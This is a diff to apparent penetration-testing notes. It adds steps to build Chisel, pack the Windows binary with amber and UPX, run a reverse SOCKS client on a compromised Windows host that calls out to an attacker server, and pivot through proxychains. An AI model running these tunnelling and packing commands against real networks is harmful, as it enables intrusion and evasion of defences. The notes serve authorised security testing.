@@ -14,7 +14,76 @@ Sources:
 
 
 ======================================================================================================================================================
-PoC/Example - Step 1 - Run Chisel in 'server mode' on your attack server (e.g. a Kali Linux VM hosted in AWS)
+PoC/Example - Step 1 - Build Chisel
+======================================================================================================================================================
+
+jeff@kali:~/Documents/Tools$ git clone https://github.com/jpillora/chisel
+Cloning into 'chisel'...
+remote: Enumerating objects: 2129, done.
+remote: Counting objects: 100% (63/63), done.
+remote: Compressing objects: 100% (46/46), done.
+remote: Total 2129 (delta 26), reused 36 (delta 15), pack-reused 2066
+Receiving objects: 100% (2129/2129), 3.46 MiB | 5.21 MiB/s, done.
+Resolving deltas: 100% (995/995), done.
+
+jeff@kali:~/Documents/Tools$ cd chisel
+
+//Linux version
+----------------
+jeff@kali:~/Documents/Tools/chisel$ go build -ldflags="-s -w"
+
+
+//Windows x32 version
+----------------------
+jeff@kali:~/Documents/Tools/chisel$ GOOS=windows GOARCH=386 go build -ldflags="-s -w"
+jeff@kali:~/Documents/Tools/chisel$ mv chisel.exe chisel386.exe 
+
+
+//Windows x64 version
+----------------------
+jeff@kali:~/Documents/Tools/chisel$ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+jeff@kali:~/Documents/Tools/chisel$ mv chisel.exe chiselamd64.exe 
+
+
+//Packing chisel Windows x32 PE with the packer amber (https://github.com/EgeBalci/amber)
+------------------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/amber_packer$ ./amber --file chisel386.exe -e 2 --build 
+                                                                                                                                                                                                                                           
+//       █████╗ ███╗   ███╗██████╗ ███████╗██████╗                                                                                                                                                                                         
+//      ██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗                                                                                                                                                                                        
+//      ███████║██╔████╔██║██████╔╝█████╗  ██████╔╝                                                                                                                                                                                        
+//      ██╔══██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗                                                                                                                                                                                        
+//      ██║  ██║██║ ╚═╝ ██║██████╔╝███████╗██║  ██║                                                                                                                                                                                        
+//      ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                                                                                                                        
+//  Reflective PE Packer ☣ Copyright (c) 2017 EGE BALCI                                                                                                                                                                                    
+//      v3.0.0 - https://github.com/egebalci/amber                                                                                                                                                                                         
+
+[*] File: chisel386.exe
+[*] Build Stub: true
+[*] Encode Count: 2
+[*] API: CRC
+[*] Final Size: 8543232 bytes
+[*] Build File: chisel386.exe
+[✔] Reflective PE generated !
+
+
+//Packing chisel Windows x32 PE with the packer UPX (https://github.com/upx/upx)
+------------------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/chisel$ upx compress chisel386.exe --brute
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+upx: compress: FileNotFoundException: compress: No such file or directory
+   8123904 ->   2289152   28.18%    win32/pe     chisel386.exe              
+
+Packed 1 file.
+
+
+======================================================================================================================================================
+PoC/Example - Step 2 - Run Chisel in 'server mode' on your attack server (e.g. a Kali Linux VM hosted in AWS)
 ======================================================================================================================================================
 
 Setting Up the Chisel Server
@@ -116,7 +185,7 @@ socks5  127.0.0.1 1080
 
 
 ======================================================================================================================================================
-PoC/Example - Step 2 - Upload and execute Chisel in 'client mode' on a compromised Windows machine 
+PoC/Example - Step 3 - Upload and execute Chisel in 'client mode' on a compromised Windows machine 
 ======================================================================================================================================================
 
 C:\temp> chisel-test.exe client --auth audit:audit2022 X.X.X.X:443 R:1080:socks
@@ -125,7 +194,7 @@ C:\temp> chisel-test.exe client --auth audit:audit2022 X.X.X.X:443 R:1080:socks
 
 
 ======================================================================================================================================================
-PoC/Example - Step 3 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Chisel to pivot into the internal network
+PoC/Example - Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Chisel to pivot into the internal network
 ======================================================================================================================================================
 
 jeff@kali:~/Documents/Tools$ sudo chisel server -p 443 --socks5 --reverse --key "private" --auth "audit:audit2022" --proxy="https://www.google.com"
